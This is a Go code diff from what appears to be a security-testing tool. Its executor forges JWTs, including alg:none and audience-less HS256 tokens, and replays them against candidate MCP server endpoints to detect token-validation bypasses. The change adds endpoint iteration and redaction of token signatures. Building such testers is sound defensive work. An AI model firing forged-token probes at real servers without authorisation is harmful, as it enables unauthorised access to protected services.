@@ -8,6 +8,7 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"strings"
 
 	"github.com/calvin-mcdowell/batesian/internal/attack"
 )
@@ -47,8 +48,6 @@ func (e *TokenReplayExecutor) Execute(ctx context.Context, target string, opts a
 	if err != nil || !metaResp.IsSuccess() {
 		return nil, nil
 	}
-
-	mcpEndpoint := vars.BaseURL + "/mcp"
 
 	// Step 2: Forge the three probe tokens.
 	noAudToken, err := forgeHS256JWT(map[string]interface{}{
@@ -123,32 +122,38 @@ func (e *TokenReplayExecutor) Execute(ctx context.Context, target string, opts a
 		},
 	}
 
-	// Step 3: Send each probe to the MCP endpoint.
+	// Step 3: Send each probe to each candidate MCP endpoint path.
+	// Since the OAuth metadata confirmed this is an OAuth-protected MCP server,
+	// we try all standard candidate paths rather than doing an unauthenticated
+	// discover probe (which would fail because the endpoint requires a token).
 	var findings []attack.Finding
 	for _, p := range probes {
 		headers := map[string]string{
 			"Authorization": "Bearer " + p.token,
 			"Content-Type":  "application/json",
 		}
-		resp, err := client.POST(ctx, mcpEndpoint, headers, json.RawMessage(mcpInitBody))
-		if err != nil {
-			continue // Network error is not a finding.
-		}
-		if resp.StatusCode == 200 {
-			findings = append(findings, attack.Finding{
-				RuleID:      e.rule.ID,
-				RuleName:    e.rule.Name,
-				Severity:    p.severity,
-				Confidence:  attack.ConfirmedExploit,
-				Title:       fmt.Sprintf("MCP server %s", p.titleSufx),
-				Description: p.descSufx,
-				Evidence: fmt.Sprintf(
-					"probe: %s\ntoken (truncated): %.120s\nHTTP %d from %s\n%s",
-					p.name, p.token, resp.StatusCode, mcpEndpoint, snippetMCP(resp.Body, 300),
-				),
-				Remediation: e.rule.Remediation,
-				TargetURL:   mcpEndpoint,
-			})
+		for _, ep := range endpointCandidates(vars.BaseURL) {
+			resp, err := client.POST(ctx, ep, headers, json.RawMessage(mcpInitBody))
+			if err != nil {
+				continue // Network error is not a finding.
+			}
+			if resp.StatusCode == 200 {
+				findings = append(findings, attack.Finding{
+					RuleID:      e.rule.ID,
+					RuleName:    e.rule.Name,
+					Severity:    p.severity,
+					Confidence:  attack.ConfirmedExploit,
+					Title:       fmt.Sprintf("MCP server %s", p.titleSufx),
+					Description: p.descSufx,
+					Evidence: fmt.Sprintf(
+						"probe: %s\ntoken header.payload: %s...[signature omitted]\nHTTP %d from %s\n%s",
+						p.name, jwtHeaderPayload(p.token), resp.StatusCode, ep, snippetMCP(resp.Body, 300),
+					),
+					Remediation: e.rule.Remediation,
+					TargetURL:   ep,
+				})
+				break // Found a responsive endpoint for this probe; no need to try others.
+			}
 		}
 	}
 
@@ -197,4 +202,14 @@ func forgeAlgNoneJWT(claims map[string]interface{}) (string, error) {
 	p := base64.RawURLEncoding.EncodeToString(payloadJSON)
 	// alg:none requires an empty (but present) signature segment.
 	return h + "." + p + ".", nil
+}
+
+// jwtHeaderPayload returns the header.payload segments of a JWT without the signature,
+// safe for inclusion in evidence output.
+func jwtHeaderPayload(token string) string {
+	parts := strings.SplitN(token, ".", 3)
+	if len(parts) >= 2 {
+		return parts[0] + "." + parts[1]
+	}
+	return "[invalid-token]"
 }
